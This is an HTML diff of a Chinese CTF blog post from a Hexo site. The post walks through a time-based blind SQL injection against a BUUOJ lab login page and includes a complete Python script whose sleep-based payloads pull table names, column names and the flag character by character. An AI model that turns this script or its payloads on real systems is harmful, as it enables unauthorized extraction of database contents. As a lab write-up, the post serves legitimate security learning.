@@ -20,17 +20,24 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
   </script>
 
-  <meta property="og:type" content="website">
-<meta property="og:title" content="categories">
-<meta property="og:url" content="http://example.com/categories/index.html">
+  <meta property="og:type" content="article">
+<meta property="og:title" content="记一次基于盲注的脚本编写">
+<meta property="og:url" content="http://example.com/2025/04/21/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%9F%BA%E4%BA%8E%E7%9B%B2%E6%B3%A8%E7%9A%84%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/index.html">
 <meta property="og:site_name" content="路漫漫其修远兮 吾将上下而求索">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-04-15T13:58:07.000Z">
-<meta property="article:modified_time" content="2025-04-15T13:58:59.000Z">
+<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-21_23-08-34.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-21_23-12-02.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-21_23-22-53.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-21_23-23-54.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2025-04-21_23-29-01.png">
+<meta property="article:published_time" content="2025-04-21T15:01:31.000Z">
+<meta property="article:modified_time" content="2025-04-21T15:29:23.967Z">
 <meta property="article:author" content="Cnext">
+<meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/Snipaste_2025-04-21_23-08-34.png">
 
-<link rel="canonical" href="http://example.com/categories/">
+<link rel="canonical" href="http://example.com/2025/04/21/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%9F%BA%E4%BA%8E%E7%9B%B2%E6%B3%A8%E7%9A%84%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/">
 
 
 <script id="page-configurations">
@@ -38,13 +45,12 @@
   CONFIG.page = {
     sidebar: "",
     isHome : false,
-    isPost : false,
+    isPost : true,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>categories | 路漫漫其修远兮 吾将上下而求索
-</title>
+  <title>记一次基于盲注的脚本编写 | 路漫漫其修远兮 吾将上下而求索</title>
   
 
 
@@ -179,51 +185,113 @@
       <div class="main-inner">
         <div class="content-wrap">
           
-  
-  
 
-          <div class="content page posts-expand">
+          <div class="content post posts-expand">
             
 
     
-    
-    
-    <div class="post-block" lang="zh-CN">
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/04/21/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%9F%BA%E4%BA%8E%E7%9B%B2%E6%B3%A8%E7%9A%84%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Cnext">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="路漫漫其修远兮 吾将上下而求索">
+    </span>
       <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          记一次基于盲注的脚本编写
+        </h1>
 
-<h1 class="post-title" itemprop="name headline">categories
-</h1>
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
 
-<div class="post-meta">
+              <time title="创建时间：2025-04-21 23:01:31 / 修改时间：23:29:23" itemprop="dateCreated datePublished" datetime="2025-04-21T23:01:31+08:00">2025-04-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <html><head></head><body><h1 id="sql盲注脚本"><a href="/2025/04/21/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%9F%BA%E4%BA%8E%E7%9B%B2%E6%B3%A8%E7%9A%84%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/#sql盲注脚本" class="headerlink" title="sql盲注脚本"></a>sql盲注脚本</h1><p>本题是一个盲注题，可以基于布尔或者是时间，采取穷举法，时间复杂度上天了，效率不高，但是好歹爆出来了</p>
+<p><img src="/images/Snipaste_2025-04-21_23-08-34.png"></p>
+<p>直接在前端进行注入的话没有回显，抓个包看看</p>
+<p><img src="/images/Snipaste_2025-04-21_23-12-02.png"></p>
+<p>可以看到有延长了，说明是单引号闭合，并且在name处存在sql盲注</p>
+<p>这个时候就可以直接写脚本进行爆破了，贴上脚本，并且进行一一解释</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#导入必要的库</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">l = <span class="string">'qwertyuiopasdfghjklzxcvbnm-=+_,.1234567890}{'</span><span class="comment">#定义一个字符串，包含所有的数据，用于猜测数据</span></span><br><span class="line">url = <span class="string">"http://2f326183-2993-42d8-8c8f-8635076e9a95.node5.buuoj.cn:81/login.php"</span><span class="comment">#目标url</span></span><br><span class="line">sql1 = <span class="string">"1' or if(substr((seLEct group_concat(table_name) from information_schema.tables  where table_schema=database()),%d,1)='%s',sleep(2),1)#"</span><span class="comment">#用来爆破库名的payload，使用两个占位符，后面在利用的时候会填入数据，下面的payload也是同理</span></span><br><span class="line">sql2 = <span class="string">"1' or if(substr((seLEct group_concat(column_name) from information_schema.columns  where table_name='fl4g'),%d,1)='%s',sleep(2),1)#"</span></span><br><span class="line">sql3 = <span class="string">"1' or if(substr((seLEct group_concat(flag) from fl4g),%d,1)='%s',sleep(2),1)#"</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):<span class="comment">#循环猜100次，按需增加猜解次数</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> l:<span class="comment">#开始逐个猜取各个位置上的字符</span></span><br><span class="line">        data = {</span><br><span class="line">            <span class="string">'name'</span> : sql3 % (num,i),</span><br><span class="line">            <span class="string">'pass'</span> : <span class="string">'asdasd'</span></span><br><span class="line">        }<span class="comment">#定义需要发送的数据以什么形式</span></span><br><span class="line">        t = <span class="built_in">int</span>(time.time())<span class="comment">#获取到发送payload时候的时间</span></span><br><span class="line">        r = requests.post(url = url , data = data , timeout = <span class="number">5</span>)<span class="comment">#使用post方式传输数据</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(time.time()) - t &gt; <span class="number">2</span>:<span class="comment">#获取到接受响应的时候的时间，并且于发送payload的时间相减，获取响应时间，与两秒进行比较，如果大于两秒，说明猜取成功</span></span><br><span class="line">            flag += i<span class="comment">#将猜取成功的数据拼接起来</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"flag:"</span>,flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"flag:"</span>,flag)<span class="comment">#打印出所有的flag</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>效果如下</p>
+<p>猜表名</p>
+<p><img src="/images/Snipaste_2025-04-21_23-22-53.png"></p>
+<p>猜字段</p>
+<p><img src="/images/Snipaste_2025-04-21_23-23-54.png"></p>
+<p>猜数据</p>
+<p><img src="/images/Snipaste_2025-04-21_23-29-01.png"></p>
+</body></html>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web/" rel="tag"># web</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/04/21/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-7day/" rel="prev" title="深度学习-7day">
+      <i class="fa fa-chevron-left"></i> 深度学习-7day
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
   
 
-</div>
-
-</header>
-
-      
-      
-      
-      <div class="post-body">
-          <div class="category-all-page">
-            <div class="category-all-title">
-              目前共计 3 个分类
-            </div>
-            <div class="category-all">
-              <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%8F%96%E8%AF%81/">取证</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/">深度学习</a><span class="category-list-count">7</span></li></ul>
-            </div>
-          </div>
-        
-      </div>
-      
-      
-      
-    </div>
-    
-
-    
-    
-    
 
 
           </div>
@@ -274,6 +342,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sql%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC"><span class="nav-number">1.</span> <span class="nav-text">sql盲注脚本</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
